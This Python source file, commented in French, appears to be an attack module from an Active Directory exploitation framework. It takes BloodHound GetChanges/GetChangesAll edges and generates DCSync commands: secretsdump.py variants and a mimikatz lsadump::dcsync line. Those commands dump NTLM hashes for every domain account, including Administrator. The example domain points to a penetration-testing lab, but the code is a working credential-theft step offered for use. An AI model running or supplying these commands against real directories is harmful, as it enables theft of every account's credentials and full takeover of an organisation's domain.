# strategies/getChangesStrategy.py
import logging

from entities.edge import Edge
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind

logger = logging.getLogger(__name__)


class GetChangesStrategy:
    """
    Exploite les permissions GetChanges + GetChangesAll sur le domaine.

    Principe :
        DCSync abuse du protocole de réplication AD (MS-DRSR).
        Un compte ayant les droits :
          - DS-Replication-Get-Changes     (GetChanges)
          - DS-Replication-Get-Changes-All (GetChangesAll)
        peut demander au DC de lui répliquer les données, incluant
        les hashes NTLM de tous les comptes (krbtgt, Administrator...).

    Note :
        Cette stratégie vérifie que les droits sont en place via
        BloodHound et fournit les commandes impacket à exécuter.
        Le DCSync réel se fait via secretsdump.py (protocole MS-DRSR).
    """

    def __init__(self, client_entity, target_dn_override: str = None):
        self.client             = client_entity
        self.target_dn_override = target_dn_override

    # ------------------------------------------------------------------ #
    #  Point d'entrée principal                                           #
    # ------------------------------------------------------------------ #

    def exploit(
        self,
        edge: Edge,
        edge_changes_all: Edge,
        dc_ip: str,
        domain: str,
        username: str,
        password: str
    ) -> ExploitResult:
        """
        :param edge:              Edge GetChanges (depuis BloodHound)
        :param edge_changes_all:  Edge GetChangesAll (depuis BloodHound)
        :param dc_ip:             IP du Domain Controller
        :param domain:            Nom du domaine (ex: sevenkingdoms.local)
        :param username:          Compte qui effectue le DCSync
        :param password:          Mot de passe du compte
        """
        if edge.kind != EdgeKind.GET_CHANGES:
            return ExploitResult(
                technique="GetChanges",
                edge=edge,
                success=False,
                notes=f"Edge invalide : attendu GET_CHANGES, reçu {edge.kind}"
            )

        source_label = edge.source_node.label

        logger.info(f"[GetChanges] {source_label} → {edge.goal_node.label}")

        try:
            # BloodHound nous confirme que le compte a les deux droits
            # On vérifie juste que la connexion LDAP fonctionne
            self._verify_ldap_connection()

            # Construire les commandes DCSync à exécuter
            target_name = edge.goal_node.label.split('@')[0].split('.')[0].upper()

            secretsdump_all = (
                f"secretsdump.py "
                f"-just-dc "
                f"'{domain}/{username}:{password}@{dc_ip}'"
            )

            secretsdump_ntlm = (
                f"secretsdump.py "
                f"-just-dc-ntlm "
                f"-outputfile dcsync_{target_name} "
                f"'{domain}/{username}:{password}@{dc_ip}'"
            )

            secretsdump_user = (
                f"secretsdump.py "
                f"-just-dc-user Administrator "
                f"'{domain}/{username}:{password}@{dc_ip}'"
            )

            mimikatz_cmd = (
                f"lsadump::dcsync /domain:{domain} "
                f"/user:Administrator "
                f"/dc:{dc_ip}"
            )

            logger.info(f"[GetChanges]  DCSync confirmé pour {source_label}")

            return ExploitResult(
                technique="GetChanges",
                edge=edge,
                success=True,
                notes=(
                    f"'{source_label}' possède GetChanges + GetChangesAll "
                    f"sur '{edge.goal_node.label}'. "
                    f"DCSync possible → dump de tous les hashes NTLM."
                ),
                next_steps=[
                    f"# Dump tous les hashes :",
                    secretsdump_all,
                    f"# Dump NTLM uniquement :",
                    secretsdump_ntlm,
                    f"# Dump Administrator uniquement :",
                    secretsdump_user,
                    f"# Mimikatz (si shell sur le DC) :",
                    mimikatz_cmd,
                ]
            )

        except Exception as e:
            logger.exception("[GetChanges] Erreur inattendue")
            return self._fail(edge, str(e))

    # ------------------------------------------------------------------ #
    #  Helpers privés                                                     #
    # ------------------------------------------------------------------ #

    def _verify_ldap_connection(self) -> None:
        """Vérifie que la connexion LDAP est active."""
        conn = self.client.ldap_connection
        if not conn or not conn.bound:
            raise ConnectionError("Connexion LDAP non établie")

    @staticmethod
    def _fail(edge: Edge, reason: str) -> ExploitResult:
        logger.warning(f"[GetChanges] ❌ {reason}")
        return ExploitResult(
            technique="GetChanges",
            edge=edge,
            success=False,
            notes=reason
        )